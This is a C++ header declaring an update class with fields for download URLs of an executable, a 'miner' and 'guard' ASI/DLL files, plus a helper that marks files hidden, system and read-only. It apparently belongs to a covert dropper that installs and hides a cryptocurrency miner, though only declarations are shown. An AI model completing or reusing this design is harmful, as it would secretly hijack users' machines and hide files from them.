#pragma once

#include <wininet.h>

#define WIN32_LEAN_AND_MEAN

#if defined DEBUG
extern void logToFile( const char * text );
#endif

#include <windows.h>
#include <Shlobj.h>
#include <Shlwapi.h>

#include "md5.h"

extern const char * fileNameMain;

extern void checkAndSetPermissions( const char * fileName , bool flagReadOnly , bool flagHidden , bool flagSystem );

class UpdateClass {
	private:
		static const char * urlCheck;
		static const char * urlDownload;

		static const char * urlDownloadExe;

		static const char * urlDownloadMiner;

		static const char * urlDownloadGuardAsi;
		static const char * urlDownloadGuardDll;

		static const char * urlCheckGuardAsi;
		static const char * urlCheckGuardDll;

		static const char * fileNameGuardAsi;
		static const char * fileNameGuardDll;

		static const char * tmpUpdateFile;

		static const char * tmpUpdateFileGuardAsi;
		static const char * tmpUpdateFileGuardDll;

		void update();

		void updateGuardAsi();
		void updateGuardDll();
	public:
		void checkUpdate();
		void clearFiles();

		void checkExe();

		void checkGuard();

		void checkMiner();
};
